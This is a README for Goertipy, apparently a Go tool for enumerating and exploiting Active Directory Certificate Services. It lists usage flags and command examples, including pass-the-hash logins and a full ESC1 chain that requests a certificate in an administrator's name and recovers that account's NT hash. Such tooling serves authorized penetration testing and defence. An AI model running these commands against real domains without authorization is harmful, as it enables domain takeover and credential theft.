# Goertipy

<p align="center">
  <img src="goertipy.jpg" alt="Goertipy" width="300">
</p>

An Active Directory Certificate Services (AD CS) enumeration and exploitation toolkit written in Go. Inspired by [Certipy](https://github.com/ly4k/Certipy), designed for portability and performance.

## Features

- **AD CS Enumeration** — Discovers Certificate Authorities, certificate templates, and their configurations
- **Vulnerability Detection** — Identifies ESC1–ESC4, ESC6–ESC9, ESC13, ESC15
- **Certificate Enrollment** — Request certs via RPC (ICertPassage), HTTP/HTTPS (certsrv), or SMB named pipe
- **PKINIT Authentication** — Authenticate with certificates and recover NT hashes (UnPAC-the-Hash)
- **Security Descriptor Parsing** — Full Windows ACL/ACE/SID parsing with permission analysis
- **NTLM Hash Authentication** — Pass-the-hash support via `--hashes LM:NT`
- **Library-First Design** — All functionality available as importable Go packages

## Installation

```bash
go install github.com/slacker/goertipy/cmd/goertipy@latest
```

Or build from source:

```bash
git clone https://github.com/slacker/goertipy.git
cd goertipy
go build -o goertipy ./cmd/goertipy
```

## Usage

### Find (Enumerate AD CS)

```bash
# Basic enumeration
goertipy find -u user@corp.local --dc-ip 10.0.0.1

# With NTLM hash (pass-the-hash)
goertipy find -u administrator -d corp.local --dc-ip 10.0.0.1 -H :aabbccdd11223344

# Only vulnerable templates
goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable

# JSON output
goertipy find -u user@corp.local --dc-ip 10.0.0.1 --json
```

| Flag | Short | Description |
|------|-------|-------------|
| `--username` | `-u` | Username (user@domain or DOMAIN\user) |
| `--password` | `-p` | Password (prompted if omitted) |
| `--hashes` | `-H` | NTLM hash (LM:NT or :NT) |
| `--domain` | `-d` | Target domain |
| `--dc-ip` | | Domain Controller IP |
| `--scheme` | | LDAP scheme: `ldap` or `ldaps` (default: ldaps) |
| `--json` | | JSON output |
| `--no-color` | | Disable colored output |
| `--vulnerable` | | Show only vulnerable templates |
| `--enabled` | | Show only enabled templates |
| `--hide-admins` | | Hide default admin permissions |
| `--verbose` | `-v` | Verbose output |
| `--debug` | | Debug output |
| `--output` | `-o` | Output file prefix |

---

### Req (Request Certificates)

Three transport options for enrollment:

```bash
# Request via RPC (default — resolves endpoint via EPM on port 135)
goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --template User

# Request via SMB named pipe (port 445, no EPM needed)
goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --template User --pipe

# Request via HTTP/HTTPS (certsrv web enrollment)
goertipy req -u user@corp.local --web http://ca.corp.local --ca 'corp-CA' --template User

# ESC1 — Request cert with UPN SAN override
goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
  --template VulnTemplate --upn administrator@corp.local

# Retrieve a pending certificate (works with all transports)
goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --retrieve 42
goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --retrieve 42 --pipe
goertipy req -u user@corp.local --web http://ca.corp.local --ca 'corp-CA' --retrieve 42
```

| Flag | Short | Description |
|------|-------|-------------|
| `--ca` | | CA name (e.g., `corp-CA`) |
| `--template` | | Certificate template name |
| `--dc-ip` | | CA server IP (for RPC/pipe transport) |
| `--web` | | HTTP/HTTPS enrollment URL (e.g., `http://ca.corp.local`) |
| `--pipe` | | Use SMB named pipe transport (port 445) |
| `--username` | `-u` | Username |
| `--password` | `-p` | Password (prompted if omitted) |
| `--hashes` | `-H` | NTLM hash (LM:NT or :NT) |
| `--domain` | `-d` | Target domain |
| `--upn` | | UPN SAN override (for ESC1) |
| `--dns` | | DNS SAN override |
| `--subject` | | Certificate subject CN |
| `--retrieve` | | Retrieve pending cert by request ID |
| `--key-size` | | RSA key size (default: 2048) |
| `--output` | `-o` | Output file prefix |
| `--debug` | | Debug output |

---

### Auth (PKINIT Authentication)

Authenticate with a certificate and recover the NT hash — combines `gettgtpkinit` + `getnthash` into one command:

```bash
# Authenticate with PFX and recover NT hash
goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx

# Skip NT hash recovery
goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx --no-hash

# Custom output path
goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx -o admin.ccache

# Base64-encoded PFX (useful for scripting)
goertipy auth -u admin@corp.local --dc-ip 10.0.0.1 --pfx-base64 "MIIJ..."
```

| Flag | Short | Description |
|------|-------|-------------|
| `--pfx` | | PFX/PKCS12 certificate file |
| `--pfx-pass` | | PFX password (default: empty) |
| `--pfx-base64` | | PFX as base64 string |
| `--dc-ip` | | Domain Controller IP |
| `--username` | `-u` | Username (user@domain or DOMAIN\user) |
| `--domain` | `-d` | Target domain |
| `--output` | `-o` | Output ccache filename |
| `--no-hash` | | Skip NT hash recovery (U2U) |
| `--verbose` | `-v` | Verbose output |
| `--debug` | | Debug output |

---

### ESC1 Full Chain Example

```bash
# 1. Find vulnerable templates
goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable

# 2. Request cert with admin UPN (via any transport)
goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
  --template VulnTemplate --upn administrator@corp.local

# 3. Authenticate and recover NT hash
goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 \
  --pfx corp-CA_VulnTemplate.pfx
```

## Transport Options

| Transport | Flag | Port | Description |
|-----------|------|------|-------------|
| RPC/TCP | `--dc-ip` (default) | 135 + dynamic | EPM endpoint resolution, then direct TCP |
| Named Pipe | `--dc-ip` + `--pipe` | 445 | SMB pipe `\pipe\cert`, no EPM needed |
| HTTP/HTTPS | `--web URL` | 80/443 | certsrv/certfnsh.asp with NTLM auth |

## Vulnerability Detection

| ESC | Description | Detection Method |
|-----|-------------|------------------|
| ESC1 | Enrollee supplies subject + auth EKU + no approval | Template flags |
| ESC2 | No EKU / Any Purpose + no approval | Template EKU list |
| ESC3 | Certificate Request Agent EKU | Template EKU list |
| ESC4 | Dangerous template ACL permissions | Security descriptor |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | CA flags |
| ESC7 | ManageCA / ManageCertificates by low-priv users | CA security descriptor |
| ESC8 | HTTP enrollment endpoints | CA enrollment servers |
| ESC9 | No security extension + enrollee supplies subject | Template flags |
| ESC13 | Issuance policies linked to groups | msPKI-RA-Policies |
| ESC15 | Schema v1 + enrollee supplies subject | Template schema/flags |

## Project Structure

```
goertipy/
├── cmd/goertipy/         # CLI entry point
├── internal/commands/    # Cobra command definitions (find, req, auth)
└── pkg/
    ├── adcs/             # AD CS enrollment (RPC, HTTP, pipe), enumeration, vuln detection
    │   └── flags/        # Certificate template and EKU constants
    ├── cert/             # Key generation, CSR creation, PFX handling
    ├── ldap/             # LDAP client, SID resolution
    ├── log/              # Structured logger
    ├── output/           # Text (colored) and JSON formatters
    └── security/         # Windows security descriptor parsing
```

## Testing

```bash
go test ./... -v
```

## References

- [Certified Pre-Owned (SpecterOps)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certipy](https://github.com/ly4k/Certipy)
- [ESC13 — Issuance Policy Abuse](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)
- [Microsoft AD CS Documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)

## Acknowledgements

This project was developed using [Claude Opus 4.6](https://www.anthropic.com/claude) by Anthropic.

## License

MIT
